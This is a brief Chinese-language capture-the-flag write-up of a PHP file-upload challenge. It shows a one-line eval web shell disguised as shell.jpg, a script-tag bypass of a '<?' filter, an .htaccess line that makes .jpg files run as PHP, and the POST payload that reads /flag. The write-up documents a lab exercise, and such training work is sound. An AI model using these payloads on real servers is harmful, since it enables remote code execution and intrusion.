感觉自己的php基本功还不是很够！！！ 先刷php题目吧

先是一个文件上传的界面

上传的数据包如下

```
------WebKitFormBoundaryEgI2BUMgdhNtGji3
Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
Content-Type: image/jpeg

<script language="php">eval($_POST['shell']);</script>
------WebKitFormBoundaryEgI2BUMgdhNtGji3
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryEgI2BUMgdhNtGji3--
```

这里的filename会被查是不是php 然后Content-Type也会双重判断

第一次知道原来form会自动判断Content-Type的，所以需要饶过一下

然后会检测<?

所以用script绕过

```javascript
<script language="php">eval($_POST['shell']);</script>
```

然后即可成功上传shell.jpg

然后再上传.htaccess覆盖

```
AddType application/x-httpd-php .jpg
```

这个的意思是对着.jpg用php方式解析

然后即可获取flag达到rce

```php
shell=var_dump(file_get_contents("/flag"));
```

php的基本函数也都忘了，php复健